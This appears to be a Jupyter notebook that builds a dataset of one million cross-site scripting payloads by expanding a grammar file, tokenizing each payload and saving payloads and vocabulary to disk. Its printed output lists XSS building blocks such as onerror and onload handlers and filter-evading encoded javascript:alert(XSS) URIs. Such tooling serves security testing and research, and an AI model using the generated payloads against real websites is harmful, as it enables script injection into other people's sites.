{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "import itertools\n",
    "import random\n",
    "import re"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "id": "iIqakVF1ebsr"
   },
   "outputs": [],
   "source": [
    "vocab = {\n",
    "    \"<pad>\": 0,\n",
    "    \"<unk>\": 1,\n",
    "    \"<bos>\": 2,\n",
    "    \"<eos>\": 3\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "id": "9WS-I-sVX9Rn"
   },
   "outputs": [],
   "source": [
    "idx = 0 # starting vocab id\n",
    "\n",
    "def load_grammar_from_file(filename):\n",
    "    grammar = {}\n",
    "    current_rule = None\n",
    "\n",
    "    with open(filename, 'r') as file:\n",
    "        for line in file:\n",
    "            line = line.strip()\n",
    "            if not line or line.startswith('//'):  # Skip comments and empty lines\n",
    "                continue\n",
    "            # Remove the trailing semicolon or other ending character\n",
    "            line = line[:-1]\n",
    "            # Check for a rule definition\n",
    "            rule_match = re.match(r'([a-zA-Z0-9_]+)\\s*:\\s*(.*)', line)\n",
    "            if rule_match:\n",
    "                current_rule = rule_match.group(1)\n",
    "                expansions = rule_match.group(2).split('|')  # Split different productions\n",
    "                grammar[current_rule] = [expansion.strip() for expansion in expansions]\n",
    "            # Continuation of rules on the next line (for multiline rules)\n",
    "            elif current_rule:\n",
    "                expansions = line.split('|')\n",
    "                grammar[current_rule].extend([expansion.strip() for expansion in expansions])\n",
    "\n",
    "    return grammar\n",
    "\n",
    "def remove_first_last_quote(input_string):\n",
    "    if input_string.startswith(\"'\") and input_string.endswith(\"'\"):\n",
    "        return input_string[1:-1]\n",
    "    return input_string\n",
    "\n",
    "def replace_escaped_quote(input_string):\n",
    "    if input_string == \"\\\\'\":\n",
    "        return \"'\"\n",
    "    return input_string\n",
    "\n",
    "def generate(rule):\n",
    "    if rule in grammar:\n",
    "        expansion = random.choice(grammar[rule]).split()\n",
    "\n",
    "        original_payload = []\n",
    "        tokenized_payload = []\n",
    "\n",
    "        for token in expansion:\n",
    "            original, token_ids = generate(token)\n",
    "            original_payload.append(original)\n",
    "            tokenized_payload.extend(token_ids)\n",
    "\n",
    "        return ''.join(original_payload), tokenized_payload\n",
    "    else:\n",
    "        processed_rule = replace_escaped_quote(remove_first_last_quote(rule))\n",
    "        if processed_rule not in vocab:\n",
    "            vocab[processed_rule] = len(vocab)\n",
    "        return processed_rule, [vocab[processed_rule]]\n",
    "\n",
    "# Load the RCE grammar\n",
    "grammar = load_grammar_from_file('grammar/XSS.txt')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "id": "krKytvjYD5G_"
   },
   "outputs": [],
   "source": [
    "def token_ids_to_original_payload(tokenized_payload, vocab):\n",
    "    id_to_token = {v: k for k, v in vocab.items()}\n",
    "    original_payload = [id_to_token[token_id] for token_id in tokenized_payload]\n",
    "    return ''.join(original_payload)\n",
    "\n",
    "# Quick check to verify tokenization consistency\n",
    "for i in range(100):\n",
    "    rce = generate('start')\n",
    "    if rce[0] != token_ids_to_original_payload(rce[1], vocab):\n",
    "        print(\"Mismatch at iteration:\", i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "mLsGk6NLnJ65",
    "outputId": "534e1c57-87ac-4057-bf7a-9be93a4e2c1b"
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'<pad>': 0, '<unk>': 1, '<bos>': 2, '<eos>': 3, '<': 4, 'button': 5, '%0d': 6, 'onblur': 7, '%09': 8, '=': 9, 'alertScript': 10, '%0dx': 11, '>': 12, 'XSS': 13, 'form': 14, 'tabindex': 15, '1': 16, '%0a': 17, '\"': 18, 'jav%26Tab%3Bascript%26colon%3B\\\\u0061lert(XSS)': 19, 'input': 20, 'type': 21, 'submit': 22, 'embed': 23, '/+/': 24, 'src': 25, 'jav%09ascript%26colon%3B\\\\u0061lert%26%23x28;XSS%26%23x29;': 26, 'onsubmit': 27, '+': 28, 'jav%0Dascript%26colon%3B\\\\u0061lert(XSS)': 29, 'details': 30, 'ontoggle': 31, '/': 32, 'jav%09ascript%26colon;alert(XSS)': 33, 'onfocus': 34, 'action': 35, '=terDQuote': 36, 'javascript%26%2300058;alert(XSS)': 37, 'body': 38, 'onload': 39, 'jav%09ascript%26colon%3B\\\\u0061lert(XSS)': 40, 'img': 41, 'onerror': 42, 'jav%0Dascript%26colon%3B\\\\u0061lert%26%23x28;XSS%26%23x29;': 43, '\\\\u0061lert(XSS)': 44, 'a': 45, 'href': 46, 'formaction': 47, 'alert(XSS)': 48, 'set': 49, 'contenteditable': 50, 'onmouseout': 51, 'object': 52, 'data': 53, \"'\\\\u0061lert(XSS)\": 54, 'onauxclick': 55, 'script': 56, 'jav\\\\u0061script%26colon;alert(XSS)': 57, 'onchange': 58, 'svg': 59, 'onpointermove': 60, 'java%26Tab;script%26colon;alert(XSS)': 61, 'nav': 62, 'onpointerout': 63, 'audio': 64, 'onselect': 65, 'jav%0Dascript:\\\\u0061lert(XSS)': 66, 'jav%26Tab%3Bascript%26colon%3B\\\\u0061lert%26%23x28;XSS%26%23x29;': 67}\n"
     ]
    }
   ],
   "source": [
    "print(vocab)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "id": "Gun4Su-EYRBc"
   },
   "outputs": [],
   "source": [
    "output = []\n",
    "tokenized_output = []\n",
    "num_payloads = 1000000\n",
    "xss_set = set()\n",
    "\n",
    "for i in range(num_payloads):\n",
    "    while True:\n",
    "        xss = generate('start')\n",
    "        if xss[0] not in xss_set:\n",
    "            xss_set.add(xss[0])\n",
    "            tokenized_output.append(xss[1])\n",
    "            output.append(f\"{xss[0]}\\n\")\n",
    "            if xss[0] != token_ids_to_original_payload(xss[1], vocab):\n",
    "                print(\"Mismatch at payload:\", i)\n",
    "            break\n",
    "\n",
    "# Write all generated payloads to file\n",
    "with open('xss.txt', 'w') as f:\n",
    "    f.writelines(output)\n",
    "with open('tokenized_xss.json', 'w') as f:\n",
    "    json.dump(tokenized_output, f)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('xss_vocab.json', 'w') as json_file:\n",
    "    json.dump(vocab, json_file, indent=4)"
   ]
  }
 ],
 "metadata": {
  "colab": {
   "provenance": []
  },
  "kernelspec": {
   "display_name": "tf-gpu",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.19"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
